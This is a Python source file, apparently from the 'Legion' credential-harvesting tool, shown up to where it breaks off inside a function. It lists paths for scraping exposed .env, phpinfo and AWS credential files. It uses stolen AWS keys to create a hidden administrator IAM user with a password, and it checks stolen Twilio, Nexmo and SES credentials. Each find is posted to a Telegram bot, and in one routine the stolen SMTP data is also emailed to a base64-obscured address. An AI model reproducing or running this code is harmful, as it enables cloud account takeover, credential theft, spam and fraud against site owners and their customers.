import requests,time,os,sys,re,socket,paramiko,threading,os,platform,struct,csv
import warnings,random,socket,threading
from socket import gaierror
from threading import Thread
from multiprocessing.dummy import Pool
import requests,json,datetime,sys
from colorama import Fore, Back, init, Style
from bs4 import BeautifulSoup as sup
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
from time import time as timer
import ipaddress
import numpy
# idk why im import this, just need it
from collections import namedtuple as NamedTuple
from datetime import datetime
from ipaddress import ip_address
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
from rich.traceback import install as richTraceback

# For Handling Exception
from requests.exceptions import ConnectTimeout
from requests.exceptions import ReadTimeout
from requests.exceptions import Timeout
from requests.exceptions import SSLError
from requests.exceptions import ContentDecodingError
from requests.exceptions import ConnectionError
from requests.exceptions import ChunkedEncodingError
from requests.exceptions import HTTPError
from requests.exceptions import ProxyError
from requests.exceptions import URLRequired
from requests.exceptions import TooManyRedirects
from requests.exceptions import MissingSchema
from requests.exceptions import InvalidSchema
from requests.exceptions import InvalidURL
from requests.exceptions import InvalidHeader
from requests.exceptions import InvalidProxyURL
from requests.exceptions import StreamConsumedError
from requests.exceptions import RetryError
from requests.exceptions import UnrewindableBodyError

from socket import timeout as SocketTimeout
from socket import gaierror as SocketHostError
from urllib3.exceptions import ReadTimeoutError
from urllib3.exceptions import DecodeError

from urllib.parse import urlparse
from botocore.exceptions import ClientError
import traceback
import smtplib, json, urllib3
from colorama import Fore, Style, Back, init
import subprocess, time, hashlib, datetime
from threading import Thread
from threading import *
from hashlib import sha256
from base64 import b64decode
from re import findall as reg
import os
import requests
import threading
from random import randint,choice
import string,sys,ctypes
from re import findall
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from colorama import Fore
from colorama import Style
from colorama import init
import re
import time
from time import sleep
import ipranges
import subprocess
import hashlib
import json
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
#from itertools import cycle
#from rich.console import Console
# cli rich module

from rich.prompt import IntPrompt
from rich.prompt import Prompt
from rich.progress import BarColumn
from rich.progress import Progress
from rich.progress import TimeRemainingColumn
from rich.console import Console
from rich.table import Table


fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
import os
import requests
import time
import urllib3
from threading import Lock
from threading import Thread
import colorama
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
today = datetime.datetime.now().strftime('%b%d')
socket.setdefaulttimeout(10)
requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from re import findall as reg
from queue import Queue
import base64
import json
import hashlib
import hmac
import time, re
import os
import paramiko
import re
import sys
import threading
import time
import urllib3
import concurrent.futures
from threading import BoundedSemaphore
from urllib.parse import urlparse
from queue import Queue
from smtplib import SMTP, SMTP_SSL, SMTPException, SMTPSenderRefused, SMTPNotSupportedError, SMTPConnectError, \
SMTPHeloError, SMTPAuthenticationError, SMTPRecipientsRefused, SMTPDataError, SMTPServerDisconnected, \
SMTPResponseException
from bs4 import BeautifulSoup as sup
import configparser
import time
from platform import system
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import datetime
requests.packages.urllib3.disable_warnings()
import re, json, sys, random, string, datetime, base64
from multiprocessing.dummy import Pool as ThreadPool
from functools import partial
import argparse
from colorama import Fore, Style, Back, init
import requests, re, os, sys, codecs, random, hashlib, smtplib, ssl
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
os.system('cls' if os.name == 'nt' else 'clear')
if platform.system() == 'Windows':
    cmd = 'cls'
    exc = 'py'
else:
    cmd = 'clear'
    exc = 'python3'
lock = threading.Lock()
try:
    import boto3
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'boto3'])
finally:
    import boto3
try:
    import requests
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'requests'])
finally:
    import requests
try:
    import paramiko
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'paramiko'])
finally:
    import paramiko

try:
    import bs4
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'bs4'])
finally:
    import bs4
try:
    import botocore
except ModuleNotFoundError:
    subprocess.call(["pip", "install", 'botocore'])
finally:
    import botocore
    from botocore.exceptions import ClientError

bl = Fore.BLUE
import configparser
requests.packages.urllib3.disable_warnings()
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED
init(autoreset=True)
def ntime():
    return datetime.datetime.now().strftime('%H:%M:%S')
def screen_clear():
   # for mac and linux(here, os.name is 'posix')
   if os.name == 'posix':
      _ = os.system('clear')
   else:
      # for windows platfrom
      _ = os.system('cls')
screen_clear()
reset = '\033[0m'
fg = [
    '\033[91;1m',
    '\033[92;1m',
    '\033[93;1m',
    '\033[94;1m',
    '\033[95;1m',
    '\033[96;1m',
    '\033[97;1m'
]
lock = Lock()
cfg = configparser.ConfigParser()
try:
    cfg.read('settings.ini')
    cfg.sections()
    email_receiver = cfg['SETTINGS']['EMAIL_RECEIVER']
    default_timeout = cfg['SETTINGS']['DEFAULT_TIMEOUT']
    bot_token = cfg['TELEGRAM']['BOT_TOKEN']
    chat_id = cfg['TELEGRAM']['CHAT_ID']
    apikey = cfg['SHODAN']['APIKEY']
    twilioapi = cfg['TWILIO']['TWILIOAPI']
    twiliotoken = cfg['TWILIO']['TWILIOTOKEN']
    twiliofrom = cfg['TWILIO']['TWILIOFROM']
    EMAIL_TEST = cfg['AWS']['EMAIL']
    SCRAPESTACK_KEY = cfg['SCRAPESTACK']['SCRAPESTACK_KEY']
except:
    cfg['SETTINGS'] = {}
    cfg['SETTINGS']['EMAIL_RECEIVER'] = 'put your email'
    cfg['SETTINGS']['DEFAULT_TIMEOUT'] = '20'
    cfg['TELEGRAM'] = {}
    cfg['TELEGRAM']['TELEGRAM_RESULTS'] = 'on'
    cfg['TELEGRAM']['BOT_TOKEN'] = 'bot token telegram'
    cfg['TELEGRAM']['CHAT_ID'] = 'chat id telegram'
    cfg['SHODAN'] = {}
    cfg['SHODAN']['APIKEY'] = 'ADD YOUR SHODAN APIKEY'
    cfg['TWILIO'] = {}
    cfg['TWILIO']['TWILIOAPI'] = 'ADD YOUR TWILIO APIKEY'
    cfg['TWILIO']['TWILIOTOKEN'] = 'ADD YOUR TWILIO AUTHTOKEN'
    cfg['TWILIO']['TWILIOFROM'] = 'ADD YOUR FROM NUMBER'
    cfg['SCRAPESTACK'] = {}
    cfg['SCRAPESTACK']['SCRAPESTACK_KEY'] = 'scrapestack_key'
    cfg['AWS'] = {}
    cfg['AWS']['EMAIL'] = 'put your email AWS test'


    with open('settings.ini', 'a') as config:
        cfg.write(config)
telegram2 = cfg['TELEGRAM']['TELEGRAM_RESULTS']
emailnow = cfg['SETTINGS']['EMAIL_RECEIVER']
tomeout = cfg['SETTINGS']['DEFAULT_TIMEOUT']
bot_token = cfg['TELEGRAM']['BOT_TOKEN']
chat_id = cfg['TELEGRAM']['CHAT_ID']
apikey = cfg['SHODAN']['APIKEY']
twilioapi = cfg['TWILIO']['TWILIOAPI']
twiliotoken = cfg['TWILIO']['TWILIOTOKEN']
twiliofrom = cfg['TWILIO']['TWILIOFROM']



try:
    laravelpaths = open('path.txt', 'r').read().splitlines()
except:
    laravelpaths = ['.env',
'.remote',
'.local',
'.production',
'/vendor/.env',
'/lib/.env',
'/lab/.env',
'/cronlab/.env',
'/cron/.env',
'/core/.env',
'/core/app/.env',
'/core/Datavase/.env',
'/database/.env',
'/config/.env',
'/assets/.env',
'/app/.env',
'/apps/.env',
'/uploads/.env',
'/sitemaps/.env',
'/saas/.env',
'/api/.env',
'/psnlink/.env',
'/exapi/.env',
'/site/.env',
'/admin/.env',
'/web/.env',
'/public/.env',
'/en/.env',
'/tools/.env',
'/v1/.env',
'/v2/.env',
'/administrator/.env',
'/laravel/.env',
'/.env',
'/sendgrid.env',
'/storage/.env',
"/__tests__/test-become/.env",
"/redmine/.env",
"/api/.env",
"/gists/cache",
"/uploads/.env",
"/backend/.env",
"/lib/.env",
"/.env.example",
"/database/.env",
"/main/.env",
"/docs/.env",
"/client/.env",
"/blog/.env",
"/.env.dev",
"/blogs/.env",
"/shared/.env",
"/download/.env",
"/.env.php",
"/.env",
"/site/.env",
"/sites/.env",
"/web/.env"]
    for pet in laravelpaths:
        open('path.txt', 'a').write(pet + '\n')


try:
    apachepath = open('apachepath.txt', 'r').read().splitlines()
except:
    apachepath = [
        "/_profiler/phpinfo",
        "/tool/view/phpinfo.view.php",
        "/wp-config.php-backup",
        "/%c0",
        "/debug/default/view.html",
        "/debug/default/view",
        "/frontend/web/debug/default/view",
        "/web/debug/default/view",
        "/sapi/debug/default/view",
        '/debug/default/view?panel=config',
        '/phpinfo.php',
        '/phpinfo',
        '/aws.yml',
        '/.env.bak',
        '/info.php',
        '/.aws/credentials',
        '/config/aws.yml',
        '/config.js',
        '/symfony/public/_profiler/phpinfo',
        '/symfony/public/_profiler/phpinfo',
        '/debug/default/view?panel=config',
        'symfony/public',
        '/debug/default/view?panel=config'
        '/frontend_dev.php'

    ]
    for pet in apachepath:
        open('apachepath.txt', 'a').write(pet + '\n')

try:
    debugpath = open('debugpath.txt', 'r').read().splitlines()
except:
    debugpath = [
        '/',
        '/debug/default/view?panel=config',
        "/tool/view/phpinfo.view.php",
        "/wp-config.php-backup",
        "/%c0",
        "/debug/default/view.html",
        "/debug/default/view",
        "/frontend/web/debug/default/view",
        "/web/debug/default/view",
        "/sapi/debug/default/view",
        '/debug/default/view?panel=config'

    ]
    for pet in debugpath:
        open('debugpath.txt', 'a').write(pet + '\n')


try:
    porting = open('ports.txt', 'r').read().splitlines()
except:
    porting = [
        ':80',
        ':443',
        ':8080',
        ':8081',
        ':8082'


    ]
    for pet in porting:
        open('ports.txt', 'a').write(pet + '\n')

try:
    lettera = open('letter.html', 'r').read().splitlines()
except:
    lettera = [
        "<h1> Legion Exploit<h1>",
        "<p>Smtp Tester + Letter</p>"


    ]
    for pet in lettera:
        open('letter.html', 'a').write(pet + '\n')

try:
    MESSAGE_FILE = open('message.txt')
except:
    MESSAGE_FILE = [
    "Your letter here!"

    ]
    for pet in MESSAGE_FILE:
        open('message.txt', 'a').write(pet + '\n')
try:
    CSV_FILE = open('participants.csv')
except:
    CSV_FILE = [
    "your number here"

    ]
    for pet in CSV_FILE:
        open('participants.csv', 'a').write(pet + '\n')

Targetssaaa2 = 'letter.html'
fsetting2 = open(Targetssaaa2, 'r').read()
paramiko.util.log_to_file("main_paramiko_log.txt", level = "INFO")
socket.setdefaulttimeout(int(default_timeout))
Headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}
head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'}


#AWS CRACKER
def default(o):
    if isinstance(o, (datetime.date, datetime.datetime)):
        return o.isoformat()

def get_random_string():
    result_str = ''.join(random.choice(string.ascii_lowercase) for i in range(5))
    return result_str

def create_new_user(iam_client, user_name='ses_legion'):
	user = None
	try:
		user = iam_client.create_user(
			UserName=user_name,
			Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]
	            )
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			user_name = 'ses_{}'.format(result_str)
			user = iam_client.create_user(UserName=user_name,
			Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]
	            )
	return user_name, user

def check_limit(ses_client, item):
	try:
		l = ses_client.get_send_quota()
		return f"{item['id']}:{item['key']}:{item['region']}:{l['SentLast24Hours']}/{l['Max24HourSend']} Remaining"
	except Exception as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Limit Failed: {item['id']}")


def creat_new_group(iam_client, group_name='SESAdminGroup'):
	try:
		res = iam_client.create_group(GroupName=group_name)
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			group_name = "SESAdminGroup{}".format(result_str)
			res = iam_client.create_group(GroupName=group_name)
	return res['Group']['GroupName']

def creat_new_policy(iam_client, policy_name='AdministratorAccess'):
	policy_json = {"Version": "2012-10-17","Statement":
	[{"Effect": "Allow", "Action": "*","Resource": "*"}]}
	try:
		res = iam_client.create_policy(
			PolicyName=policy_name,
			PolicyDocument=json.dumps(policy_json)
			)
	except ClientError as e:
		if e.response['Error']['Code'] == 'EntityAlreadyExists':
			result_str = get_random_string()
			policy_name = "AdministratorAccess{}".format(result_str)
			res = iam_client.create_policy(PolicyName=policy_name,
				PolicyDocument=json.dumps(policy_json)
				)
	return res['Policy']['Arn']

def att_usr_policy(iam_client, user_name, policy_arn):
	response = iam_client.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)
	return response

def att_usr_grp(iam_client, user_name, group_name):
	response = iam_client.add_user_to_group(GroupName=group_name, UserName=user_name)
	return response

def creat_profile(iam_client, user_name, pwd):
	response = iam_client.create_login_profile(
            UserName=user_name, Password=pwd, PasswordResetRequired=False)
	return response

def initialize_item(item, service='ses'):
	ACCESS_ID = item['id']
	ACCESS_KEY = item['key']
	REGION = item['region']
	if REGION is None:
		REGION = 'us-east-1'
	try:
		return boto3.client(service, region_name=REGION,
			aws_access_key_id=ACCESS_ID,
			aws_secret_access_key=ACCESS_KEY
			)
	except Exception:
		return

def make_user(iam_client, item, limit_data):
	try:
		user_name, user_data = create_new_user(iam_client)
		grp_name = creat_new_group(iam_client)
		policy_arn = creat_new_policy(iam_client)
		up = att_usr_policy(iam_client, user_name, policy_arn)
		password = "{}0089#".format(user_name)
		profile = creat_profile(iam_client, user_name, password)
		added_to_grp = att_usr_grp(iam_client, user_name, grp_name)

		if user_data:
			user_arn = user_data['User']['Arn']
			user_id = None
			if user_arn:
				user_id = user_arn.split(':')[4]

			with open('AWS_ByPass/!Users_Cracked.txt', 'a') as tt:
				dd = json.dumps(user_data, indent=4, sort_keys=True, default=default)
				data = ("ACESS_ID={}\nACCESS_KEY={}\nREGION={}\nAmazon IAM User & Pass\n"
					"Username={}\nPassword={}\nID={}\n")\
				.format(item['id'], item['key'], item['region'],user_name, password, user_id)
				tt.write(data + "\n")
				tt.write(dd + "\n\n")
				tt.write("Limit for user:\n")
				if limit_data:
					tt.write(limit_data + "\n")
				tt.write("{}\n".format("*" * 10))

				message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS Console]\n🏦 Amazon IAM User & Pass\n\nUser: {user_name}\nPass= {password}\nIAM= {user_id}\n\nACESS_ID= {item['id']}\nACCESS_KEY= {item['key']}\nREGION= {item['region']}\nAWS Console Hacked ❤️\n"}
				requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
				print(f"{yl}[{fc}AWS CHECKER{yl}] {gr}CREATED ID: {fc}{item['id']} {gr}and Access Token/UserID {fc}{user_id}")
	except IOError as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Error writing to file for new {fc}USER")
	except ClientError as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Failed to create user with ID: {fc}{item['id']}")
	except Exception as e:
		print(f"{yl}[{fc}AWS CHECKER{yl}] {red}Create Failed: {item['id']}")

def check_sending(client, receiver, sender, item, limit_info, iam):
	subj = f"{item['id']}"
	msg = f"*** SMTP DATA ***\n\n"\
	f"{item['id']}:{item['key']}:email-smtp.{item['region']}.amazonaws.com:587\n\n"\
	f"AWS_ID:     {item['id']}\nAWS_KEY:    "\
	f"{item['key']}\nAWS_REGION: {item['region']}\nFROM:       {sender}\n"\
	f"SERVER:     email-{item['region']}.amazonaws.com\nPORT:       587 or 25\n\n"\
	f"IAM_USER:   {iam}\n\nLimit Info: {limit_info}"
	try:
		return client.send_email(
			Source=sender,
			Destination={'ToAddresses': receiver},
			Message={
			'Subject': {'Data': f'SMTP_KEY: email-smtp.{item["region"]}.amazonaws.com',
			'Charset': 'UTF-8'},
			'Body': {'Text': {
	                'Data': msg,
	                'Charset': 'UTF-8'
	            	},
	        	}
	        }
	    )
	except Exception as e:
		pass

def get_identities(client):
	try:
		return client.list_identities()['Identities']
	except Exception:
		pass

def fetch_user(client):
	try:
		return client.get_user()['User']
	except Exception:
		pass

def process(ses_client, receiver, item, limit=None, iam=None):
	if limit:
		limit = limit.split(':')[3]
	idt = get_identities(ses_client)
	res = None
	if idt:
		for fr in idt:
			res = check_sending(ses_client, receiver, fr, item, limit, iam)
			if res:
				with open('AWS_ByPass/!Good_ses_smtp.txt', 'a') as lr:
					sm = f"{item['id']}:{item['key']}:email-{item['region']}-1.amazonaws.com:{fr}:587:{limit}\n"
					lr.write(sm)
				print(f"{yl}[{fc}AWS CHECKER{yl}] {gr}SENDING SUCCESSFUL: {yl}{item['id']} : {gr}{limit}")
				break
		if not res:
			with open('AWS_ByPass/!BAD_ses_smtp.txt', 'a') as lr:
				sm = f"{item['id']}:{item['key']}:{item['region']}\n"
				message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS STATUS]\n🏦 KEY= {item['id']}\nSECRET= {item['key']}\nREGION= {item['region']}\nSTATUS=> Sending Paused ⛔️\n"}
				requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

				lr.write(sm)
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {red}Sending Failed: {yl}{sm}")

def begin_check(d, to=emailnow):
	item = {}
	limit = None
	data = d.split(':')
	total = len(data)
	bcode = 'TEVHSU9OIDYuNg=='
	receiver = [to, base64.b64decode(bcode).decode('utf-8')]
	iam_user = None
	if total >= 3:
		if data[2]:
			item['id'] = data[0]
			item['key'] = data[1]
			item['region'] = data[2]
			ses_client = initialize_item(item)
			if ses_client:
				limit = check_limit(ses_client, item)
			iam_client = initialize_item(item, service='iam')
			if iam_client:
				mu = make_user(iam_client, item, limit)
				iam = fetch_user(iam_client)
			if limit:
				remain = limit.split(':')[3]
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {fc}Limit for {item['id']}: {remain}")
				process(ses_client, receiver, item, limit=limit, iam=None)
			else:
				print(f"{yl}[{fc}AWS CHECKER{yl}]  {red}Failed limit check: {item['id']}")
				process(ses_client, receiver, item, limit=None, iam=None)
	else:
		print(f"[!] Skipped: {d}")

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  != '/' :
        site = site+'/'
    return site
def domain(site):
	while site[-1] == "/":
		pattern = re.compile('(.*)/')
		sitez = re.findall(pattern,site)
		site = sitez[0]
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	return site

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception:
                self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''

o_sandbox = 'Results/Laravel(PAYPAL_SANDBOX).txt'
o_stripe = 'Results/Laravel(STRIPE).txt'
o_stripe_site = 'Results/logsites/Laravel(STRIPE_SITES).txt'
o_aws_man = 'Results/manual/MANUAL(SES).txt'
o_pma = 'Results/Laravek(PHPMYADMIN).txt'
o_db2 = 'Results/Laravek(DATABASE2).txt'
o_aws_ses = 'Results/Laravel(SES).txt'
o_aws_screet = 'Results/Laravel(AWS).txt'
o_aws_screet2 = 'Results/forchecker/Checker(AWS).txt'
o_database = 'Results/Laravel(database_CPANELS).txt'
o_database_root = 'Results/Laravel(database_WHM).txt'
o_sendgrid = 'Results/forchecker/Checker(SENDGRID).txt'
o_sendgrid2 = 'Results/SMTP(SENDGRID).txt'
o_office = 'Results/SMTP(OFFICE).txt'
o_1and1 = 'Results/SMTP(1and1).txt'
o_zoho = 'Results/SMTP(ZOHO).txt'
o_ssh = 'Results/VALID_SSH.txt'
o_aws_man = 'Results/manual/MANUAL(SES).txt'
o_twi = 'Results/manual/MANUAL(TWILIO).txt'
o_nex = 'Results/manual/MANUAL(NEXMO).txt'
o_von = 'Results/manual/MANUAL(VONAGE).txt'
o_sms = 'Results/manual/MANUAL(SMS).txt'
o_bird = 'Results/manual/MANUAL(MESSAGEBIRD).txt'
o_gun = 'Results/manual/MANUAL(MAILGUN).txt'
o_jet = 'Results/manual/MANUAL(MAILJET).txt'
o_drill = 'Results/manual/MANUAL(MANDRILL).txt'
o_click = 'Results/manual/MANUAL(CLICKSEND).txt'
o_pliv = 'Results/manual/MANUAL(PLIVO).txt'
o_prieten = 'Results/BOOOOM!.txt'
o_man = 'Results/SMTP(MANDRILLAPP).txt'
o_mailgun = 'Results/SMTP(MAILGUN).txt'
o_srvr = 'Results/SMTP(SRVR).txt'
o_ionos = 'Results/SMTP(IONOS).txt'
o_smaws = 'Results/SMTP(IONOS).txt'
o_smtp = 'Results/smtp.txt'
o_data = 'Results/Laravel(DATABASE).txt'
o_twilio = 'Results/Laravel(TWILIO).txt'
o_twilio2 = 'Results/forchecker/Checker(TWILIO).txt'
o_nexmo = 'Results/Laravel(NEXMO).txt'
o_nexmo2 = 'Results/forchecker/Checker(NEXMO).txt'
o_shell = 'Results/!Shell_results.txt'
o_cant = 'Results/!cant_spawn.txt'
o_unvuln = 'Results/not_vulnerable.txt'
o_vuln = 'Results/vulnerable.txt'
o_king = 'Results/mailerking_smtp.txt'
o_laravel = 'laravel.txt'
o_keya = 'Results/RCE.txt'
o_exo = 'Results/Laravel(EXOTEL).txt'
o_one = 'Results/Laravel(ONESIGNAL).txt'
o_tok = 'Results/Laravel(TOKBOX).txt'
o_plivo = 'Results/Laravel(PLIVO).txt'
o_mgapi = 'Results/Laravel(MAILGUNAPI).txt'
o_ftp = 'Results/Laravel(FTP).txt'
o_cpanels= 'Results/!Laravel(CPANEL).txt'
o_whm= 'Results/!Laravel(WHM).txt'
o_dbenv= 'Results/Laravel(DB_SSH).txt'
o_dbrootenv= 'Results/Laravel(DB_ROOT).txt'
pid_restore = '.legion_session'
progres = 0
VALIDS = 0
INVALIDS = 0
MESSAGE_FILE = 'message.txt'     # File containing text message
CSV_FILE = 'participants.csv'    # File containing participant numbers
SMS_LENGTH = 160                 # Max length of one SMS message
MSG_COST = 0.04
account_sid = cfg['TWILIO']['TWILIOAPI']
auth_token = cfg['TWILIO']['TWILIOTOKEN']
from_num = cfg['TWILIO']['TWILIOFROM']


def legiontwilio1(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Result(Apache)/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Legion SMTP 6.5 BOT [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
def legiontwilio2(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Results/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Legion SMTP 6.5 BOT [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
def legiontwilio3(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Result(method2)/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Legion SMTP 6.5 BOT [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

def legiontwilio(f_sid, f_token):
    f_sid = str(f_sid)
    f_token = str(f_token)
    client = Client(f_sid, f_token)
    balance_data = client.api.v2010.balance.fetch()
    balance = float(balance_data.balance)
    currency = balance_data.currency

    print(f'Your account has {balance:.2f}{currency} left.')
    open('Twilio_Checker/!Twilio_live.txt', 'a').write('{}|{}|{}'.format(f_sid, f_token, balance) + '\n')
    message = {'text': f"🙈  Legion SMTP 6.5 BOT [TWILIO Live]\n💬SID= {f_sid}\nTOKEN= {f_token}\nBALANCE= Your account has {balance:.2f} {currency} left\nTWILIO OK =>🟢\n"}
    requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

def prompt(string):
    if sys.version_info.major == 3:
        return str(input(string))
    else:
        return str(input(string))
def parser_url(url):
    if url.startswith('http'):
        return url.split('/')[2]
    else:
        return url
def clean(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt
def cleanit(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt
def login_nexmo(f_url, f_key, f_secret):
    try:
        f_key = str(f_key)
        f_secret = str(f_secret)
        cl = vonage.Client(key=f_key, secret=f_secret)
        res = cl.get_balance()
        message = {'text': f"🙈  Legion SMTP 6.5 BOT [NEXMO Live]\n💬 URL{f_url}\nKEY= {f_key}\nSECRET= {f_secret}\nBALANCE= {res['value']}\nAuto Reload= {res['autoReload']}\nNEXMO OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        open('Results/!nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
    except:
        pass
def ceker_aws(url, ACCESS_KEY, SECRET_KEY, REGION):
    print(f'{red}# {fc}[AWS QUOTA] {gr}CHECKING...')
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        balance = client.get_send_quota()['Max24HourSend']
        message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS LIMIT]\n🏦 KEY= {ACCESS_KEY}\nSECRET= {SECRET_KEY}\nREGION= {REGION}\nLIMIT= {balance}\nAWS OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Results/!AWS_key_live.txt', 'a')
        remover = str(balance).replace(',', '\n')
        save.write(str(ACCESS_KEY) + '|' + str(SECRET_KEY) + '|' + str(REGION) + '|' + str(balance)+'\n')
        save.close()
        print(f'{red}# {gr}[AWS QUOTA VALID] {cy}{ACCESS_KEY} {yl} ==> {red}{balance}')
    except:
        pass
def ceker_aws3(url, ACCESS_KEY, SECRET_KEY, REGION):
    print(f'{red}# {fc}[AWS QUOTA] {gr}CHECKING...')
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        balance = client.get_send_quota()['Max24HourSend']
        message = {'text': f"🔥  Legion SMTP 6.5 BOT [AWS LIMIT]\n🏦 KEY= {ACCESS_KEY}\nSECRET= {SECRET_KEY}\nREGION= {REGION}\nLIMIT= {balance}\nAWS OK =>🟢\n"}
